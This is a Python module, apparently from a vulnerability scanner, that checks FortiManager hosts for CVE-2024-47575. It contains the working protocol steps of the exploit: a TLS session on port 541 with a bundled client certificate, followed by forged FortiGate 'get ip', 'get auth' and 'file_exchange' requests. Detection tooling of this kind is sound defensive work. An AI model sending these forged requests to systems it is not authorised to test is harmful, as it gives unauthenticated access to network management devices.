"""Agent Asteroid implementation for CVE-2024-47575"""

import socket
import re
import struct
import ssl
import random

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Missing Authentication for critical function in FortiManager"
VULNERABILITY_REFERENCE = "CVE-2024-47575"
VULNERABILITY_DESCRIPTION = (
    "A missing authentication for critical function in FortiManager 7.6.0, FortiManager 7.4.0 through 7.4.4, FortiManager 7.2.0 through 7.2.7,"
    " FortiManager 7.0.0 through 7.0.12, FortiManager 6.4.0 through 6.4.14, FortiManager 6.2.0 through 6.2.12, Fortinet FortiManager Cloud 7.4.1 through 7.4.4, FortiManager Cloud 7.2.1 through 7.2.7, FortiManager Cloud 7.0.1 through 7.0.12,"
    " FortiManager Cloud 6.4.1 through 6.4.7 allows attacker to execute arbitrary code or commands via specially crafted requests."
)
RISK_RATING = "CRITICAL"

REQUEST_GETIP = b"""get ip
serialno=FGVMEVWG8YMT3R63
mgmtid=00000000-0000-0000-0000-000000000000
platform=FortiGate-VM64
fos_ver=700
minor=2
patch=2
build=1255
branch=1255
maxvdom=2
fg_ip=192.168.1.53
hostname=FGVMEVWG8YMT3R63
harddisk=yes
biover=04000002
harddisk_size=30720
logdisk_size=30235
mgmt_mode=normal
enc_flags=0
first_fmgid=
probe_mode=yes
vdom=root
intf=port1
\0""".replace(b"\n", b"\r\n")

REQUEST_AUTH = b"""get auth
serialno=FGVMEVWG8YMT3R63
mgmtid=00000000-0000-0000-0000-000000000000
platform=FortiGate-60E
fos_ver=700
minor=2
patch=4
build=1396
branch=1396
maxvdom=2
fg_ip=192.168.1.53
hostname=FortiGate
harddisk=yes
biover=04000002
harddisk_size=30720
logdisk_size=30107
mgmt_mode=normal
enc_flags=0
mgmtip=192.168.1.53
mgmtport=443
\0""".replace(b"\n", b"\r\n")

REQUEST_FILE_EXCHANGE = b"""get file_exchange
localid=REPLACE_LOCAL_ID
chan_window_sz=32768
deflate=gzip
file_exch_cmd=put_json_cmd

\0""".replace(b"\n", b"\r\n").replace(
    b"REPLACE_LOCAL_ID", str(random.randint(100, 999)).encode()
)

FGFM_PORT = 541


def _sendmsg(socket: ssl.SSLSocket, request: bytes) -> bytes:
    """Send a message over an SSL socket and read the response."""
    message = struct.pack(">II", 0x36E01100, len(request) + 8) + request
    socket.send(message)
    try:
        hdr = socket.read(8)
    except TimeoutError:
        return b""

    if len(hdr) != 8:
        return hdr

    try:
        magic, size = struct.unpack(">II", hdr)
        return socket.read(size)
    except TimeoutError:
        return b""


def _create_ssl_sock(target: str) -> ssl.SSLSocket:
    """Create an SSL socket connected to the target."""
    host = (target, FGFM_PORT)
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

    context.load_cert_chain(
        certfile="./agent/Resources/FortimangerCerts/w00t_cert.bin",
        keyfile="./agent/Resources/FortimangerCerts/w00t_key.bin",
    )
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    s = socket.create_connection(host, 30)
    ssl_sock = context.wrap_socket(s)
    return ssl_sock


@exploits_registry.register
class CVE202447575Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/p/login/")
    accept_pattern = [re.compile("FortiManager")]

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect specific vulnerability on a specific target.

        Args:
            target: Target to scan.

        Returns:
            List of identified vulnerabilities.
        """
        vulnerabilities: list[definitions.Vulnerability] = []
        ssl_sock = _create_ssl_sock(target.host)

        _sendmsg(ssl_sock, REQUEST_GETIP)
        _sendmsg(ssl_sock, REQUEST_AUTH)
        response = _sendmsg(ssl_sock, REQUEST_FILE_EXCHANGE)

        try:
            decoded_response = response.decode()
            response_lines = decoded_response.split("\r\n")

            remote_id_line = next(
                (line for line in response_lines if line.startswith("remoteid=")), None
            )

            if remote_id_line is not None:
                remote_id = remote_id_line.split("=")[1].strip()
                if remote_id != "":
                    vulnerability = self._create_vulnerability(target)
                    vulnerabilities.append(vulnerability)
        except (UnicodeDecodeError, IndexError, ValueError):
            return vulnerabilities

        return vulnerabilities
